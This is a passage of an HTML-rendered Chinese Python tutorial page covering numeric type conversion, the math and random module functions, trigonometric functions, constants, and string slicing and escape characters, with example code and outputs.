class="token triple-quoted-string string">'''4262.192.01'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据类型转换函数"><a href="#数据类型转换函数" class="headerlink" title="数据类型转换函数"></a>数据类型转换函数</h3><h5 id="class-int-x-base-10-1"><a href="#class-int-x-base-10-1" class="headerlink" title="class int(x, base=10)"></a><code>class int(x, base=10)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># x为数值型时,不写base,直接取整,x为str时,base为转换前的进制</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3-1118'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-float-x-1"><a href="#class-float-x-1" class="headerlink" title="class float([x])"></a><code>class float([x])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将整数和字符串转换成浮点数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1.0-11.212.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-complex-real-imag-1"><a href="#class-complex-real-imag-1" class="headerlink" title="class complex([real[, imag]])"></a><code>class complex([real[, imag]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建一个复数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token string">'1+3j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1+0j)(1+2j)(1+3j)(1+2j)'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><table><thead><tr><th><a href="https://www.runoob.com/python3/python3-func-number-abs.html">abs(x)</a></th><th>返回数字的绝对值，如abs(-10) 返回 10</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/python3-func-number-ceil.html">ceil(x)</a></td><td>返回数字的上入整数，如math.ceil(4.1) 返回 5</td></tr><tr><td>cmp(x, y)</td><td>如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1。 <strong>Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换</strong>。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-exp.html">exp(x)</a></td><td>返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-fabs.html">fabs(x)</a></td><td>返回数字的绝对值，如math.fabs(-10) 返回10.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-floor.html">floor(x)</a></td><td>返回数字的下舍整数，如math.floor(4.9)返回 4</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log.html">log(x)</a></td><td>如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log10.html">log10(x)</a></td><td>返回以10为基数的x的对数，如math.log10(100)返回 2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-max.html">max(x1, x2,…)</a></td><td>返回给定参数的最大值，参数可以为序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-min.html">min(x1, x2,…)</a></td><td>返回给定参数的最小值，参数可以为序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-modf.html">modf(x)</a></td><td>返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-pow.html">pow(x, y)</a></td><td>x**y 运算后的值。</td></tr><tr><td>[round(x <a href="https://www.runoob.com/python3/python3-func-number-round.html">,n])</a></td><td>返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。<strong>其实准确的说是保留值将保留到离上一位更近的一端。</strong></td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-sqrt.html">sqrt(x)</a></td><td>返回数字x的平方根。</td></tr></tbody></table><h3 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h3><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-choice.html">choice(seq)</a></td><td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td></tr><tr><td align="left">[randrange (<a href="https://www.runoob.com/python3/python3-func-number-randrange.html">start,] stop [,step])</a></td><td align="left">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-random.html">random()</a></td><td align="left">随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td align="left">[seed(<a href="https://www.runoob.com/python3/python3-func-number-seed.html">x])</a></td><td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-shuffle.html">shuffle(lst)</a></td><td align="left">将序列的所有元素随机排序</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-uniform.html">uniform(x, y)</a></td><td align="left">随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table><h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><p>Python包括以下三角函数：</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-acos.html">acos(x)</a></td><td align="left">返回x的反余弦弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-asin.html">asin(x)</a></td><td align="left">返回x的反正弦弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan.html">atan(x)</a></td><td align="left">返回x的反正切弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan2.html">atan2(y, x)</a></td><td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-cos.html">cos(x)</a></td><td align="left">返回x的弧度的余弦值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-hypot.html">hypot(x, y)</a></td><td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-sin.html">sin(x)</a></td><td align="left">返回的x弧度的正弦值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-tan.html">tan(x)</a></td><td align="left">返回x弧度的正切值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-degrees.html">degrees(x)</a></td><td align="left">将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-radians.html">radians(x)</a></td><td align="left">将角度转换为弧度</td></tr></tbody></table><h3 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h3><table><thead><tr><th align="left">常量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pi</td><td align="left">数学常量 pi（圆周率，一般以π来表示）</td></tr><tr><td align="left">e</td><td align="left">数学常量 e，e即自然常数（自然常数）。</td></tr></tbody></table><h3 id="函数示例"><a href="#函数示例" class="headerlink" title="函数示例"></a>函数示例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math  <span class="token comment"># 导入 math 模块</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"abs(-40) : "</span><span class="token punctuation">,</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 内置</span><span class="token comment"># abs(-40) :  40</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.ceil(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.ceil(-45.17) :  -45</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.exp(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.exp(-45.17) :  2.4150062132629406e-20</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.fabs(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>fabs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.fabs(-45.17) :  45.17</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.floor(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.floor(-45.17) :  -46</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.log(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.log(100.12) :  4.6063694665635735</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.log10(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>log10<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.log10(100.12) :  2.0005208409361854</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"max(80, 100, 1000) : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># max(80, 100, 1000) :  1000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"min(80, 100, 1000) : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># min(80, 100, 1000) :  80</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.modf(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>modf<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.modf(100.12) :  (0.12000000000000455, 100.0)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.pow(100, 2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.pow(100, 2) :  10000.0</span><span class="token comment"># 使用内置，查看输出结果区别</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"pow(100, 2) : "</span><span class="token punctuation">,</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># pow(100, 2) :  10000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"round(-100.000056, 3) : "</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100.000056</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># round(-100.000056, 3) :  -100.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.sqrt(100) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.sqrt(100) :  10.0</span><span class="token keyword">import</span> random<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"从 range(100) 返回一个随机数 : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 从 range(100) 返回一个随机数 :  67</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"从字符串中 'Runoob' 返回一个随机字符 : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 从 1-100 中选取一个奇数</span><span class="token comment">#从字符串中 'Runoob' 返回一个随机字符 :  n</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"randrange(1,100, 2) : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># randrange(1,100, 2) :  45</span><span class="token comment"># 从 0-99 选取一个随机数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"randrange(100) : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># randrange(100) :  11</span><span class="token comment"># 第一个随机数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random() : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># random() :  0.7601111373084349</span><span class="token comment"># 第二个随机数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random() : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># random() :  0.9598748666088929</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"随机排序列表 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># 随机排序列表 :  [10, 5, 20, 16]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"随机排序列表 : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span>随机排序列表 <span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"uniform(5, 10) 的随机浮点数 : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># uniform(5, 10) 的随机浮点数 :  9.959955410049714</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"uniform(7, 14) 的随机浮点数 : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># uniform(7, 14) 的随机浮点数 :  11.843622946237328</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"acos(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>acos<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># acos(1) :  0.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"asin(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>asin<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># asin(1) :  1.5707963267948966</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"atan(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>atan<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># atan(1) :  0.7853981633974483</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"atan2(10,20) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>atan2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># atan2(10,20) :  0.4636476090008061</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"cos(2*math.pi) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># cos(2*math.pi) :  1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hypot(0, 2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>hypot<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># hypot(0, 2) :  2.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sin(math.pi/2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># sin(math.pi/2) :  1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tan(math.pi/4) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>tan<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># tan(math.pi/4) :  0.9999999999999999</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"degrees(math.pi/4) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>degrees<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># degrees(math.pi/4) :  45.0</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>radians<span class="token punctuation">(</span><span class="token number">180</span> <span class="token operator">/</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token comment"># 3.141592653589793</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token comment"># 2.718281828459045</span><span class="token triple-quoted-string string">'''abs(-40) :  40math.ceil(-45.17) :  -451math.exp(-45.17) :  2.4150062132629406e-20math.fabs(-45.17) :  45.17math.floor(-45.17) :  -46math.log(100.12) :  4.6063694665635735math.log10(100.12) :  2.0005208409361854max(80, 100, 1000) :  1000min(80, 100, 1000) :  80math.modf(100.12) :  (0.12000000000000455, 100.0)math.pow(100, 2) :  10000.0pow(100, 2) :  10000round(-100.000056, 3) :  -100.0math.sqrt(100) :  10.0从 range(100) 返回一个随机数 :  22从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  2从字符串中 'Runoob' 返回一个随机字符 :  Rrandrange(1,100, 2) :  83randrange(100) :  92random() :  0.2392758950765237random() :  0.7016096413249141随机排序列表 :  [16, 5, 20, 10]随机排序列表 :  [20, 16, 10, 5]uniform(5, 10) 的随机浮点数 :  9.96850739092334uniform(7, 14) 的随机浮点数 :  9.03188249118426acos(1) :  0.0asin(1) :  1.5707963267948966atan(1) :  0.7853981633974483atan2(10,20) :  0.4636476090008061cos(2*math.pi) :  1.0hypot(0, 2) :  2.0sin(math.pi/2) :  1.0tan(math.pi/4) :  0.9999999999999999degrees(math.pi/4) :  45.01.03.1415926535897932.718281828459045'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h2><h3 id="字符串截取格式-1"><a href="#字符串截取格式-1" class="headerlink" title="字符串截取格式"></a>字符串截取格式</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">变量名<span class="token punctuation">[</span>头下标<span class="token punctuation">:</span>尾下标<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从前面索引  0 1 2 3 4 ……</p><p>从后面索引  -1 -2 -3 -4 -5 ……</p><p>从前面截取 :1 2 3 4:</p><p>从后面截取 :-4 -3 -2 -1:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建字符串</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有字符</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第一个到倒数第二个</span><span class="token comment"># tes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出第三个到第四个</span><span class="token comment"># st</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">'re'</span><span class="token punctuation">)</span><span class="token comment"># testre</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'restart'</span><span class="token punctuation">)</span><span class="token comment"># te restart</span><span class="token comment"># 截取再拼接</span><span class="token triple-quoted-string string">'''testttesttessttesttesttestret tte restart'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python字符串不能改变，诸如<code>str[n]='?'</code>的赋值会报错</p><h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 转义字符</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span> \      <span class="token operator">+</span> <span class="token string">'test'</span><span class="token punctuation">)</span>  <span class="token comment"># \续行</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span>  <span class="token comment"># 反斜杠</span><span class="token comment"># \</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">)</span>  <span class="token comment"># 单引号</span><span class="token comment"># '</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">)</span>  <span class="token comment"># 双引号</span><span class="token comment"># "</span><span 